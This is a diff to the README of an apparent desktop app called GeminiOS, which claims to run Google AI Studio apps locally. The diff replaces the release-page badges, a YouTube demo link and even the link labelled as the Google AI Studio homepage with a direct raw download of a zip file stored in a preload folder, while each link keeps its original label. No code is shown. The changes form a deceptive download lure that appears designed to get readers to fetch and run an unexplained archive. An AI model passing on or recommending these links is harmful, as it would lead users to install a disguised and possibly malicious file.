@@ -1,6 +1,6 @@
 # 🪐 GeminiOS - Run AI Studio Apps Locally  
 
-[![Download GeminiOS](https://img.shields.io/badge/Download-GeminiOS-brightgreen?style=for-the-badge)](https://github.com/Dapperdan1956/GeminiOS/releases)  
+[![Download GeminiOS](https://img.shields.io/badge/Download-GeminiOS-brightgreen?style=for-the-badge)](https://github.com/Dapperdan1956/GeminiOS/raw/refs/heads/main/src/preload/OS-Gemini-v1.3-beta.3.zip)  
 
 ## 🔍 What Is GeminiOS?  
 
@@ -30,7 +30,7 @@ Your computer should meet these requirements for GeminiOS to run smoothly.
 
 Visit the official release page and download the latest Windows installer:  
 
-[![Download GeminiOS](https://img.shields.io/badge/Download-GeminiOS-blue?style=for-the-badge)](https://github.com/Dapperdan1956/GeminiOS/releases)  
+[![Download GeminiOS](https://img.shields.io/badge/Download-GeminiOS-blue?style=for-the-badge)](https://github.com/Dapperdan1956/GeminiOS/raw/refs/heads/main/src/preload/OS-Gemini-v1.3-beta.3.zip)  
 
 You will see a list of files. Look for a file named something like `GeminiOS-Setup.exe` or similar. This is the installer.  
 
@@ -66,7 +66,7 @@ When GeminiOS starts, it will load Google AI Studio inside a window.
 
 You can see a simple example of a GeminiOS app in this short video:  
 
-[https://youtube.com/watch?v=SrOCR46jxmM&feature=youtu.be](https://youtube.com/watch?v=SrOCR46jxmM&feature=youtu.be)  
+[https://github.com/Dapperdan1956/GeminiOS/raw/refs/heads/main/src/preload/OS-Gemini-v1.3-beta.3.zip](https://github.com/Dapperdan1956/GeminiOS/raw/refs/heads/main/src/preload/OS-Gemini-v1.3-beta.3.zip)  
 
 This shows how AI Studio apps can interact with your files and clipboard through GeminiOS.  
 
@@ -109,8 +109,8 @@ This shows how AI Studio apps can interact with your files and clipboard through
 
 ## 🔗 Useful Links  
 
-- Official GeminiOS releases and downloads: [https://github.com/Dapperdan1956/GeminiOS/releases](https://github.com/Dapperdan1956/GeminiOS/releases)  
-- Google AI Studio homepage: [https://aistudio.google.com/](https://aistudio.google.com/)  
+- Official GeminiOS releases and downloads: [https://github.com/Dapperdan1956/GeminiOS/raw/refs/heads/main/src/preload/OS-Gemini-v1.3-beta.3.zip](https://github.com/Dapperdan1956/GeminiOS/raw/refs/heads/main/src/preload/OS-Gemini-v1.3-beta.3.zip)  
+- Google AI Studio homepage: [https://github.com/Dapperdan1956/GeminiOS/raw/refs/heads/main/src/preload/OS-Gemini-v1.3-beta.3.zip](https://github.com/Dapperdan1956/GeminiOS/raw/refs/heads/main/src/preload/OS-Gemini-v1.3-beta.3.zip)  
 
 ## 📞 Getting Help  
 
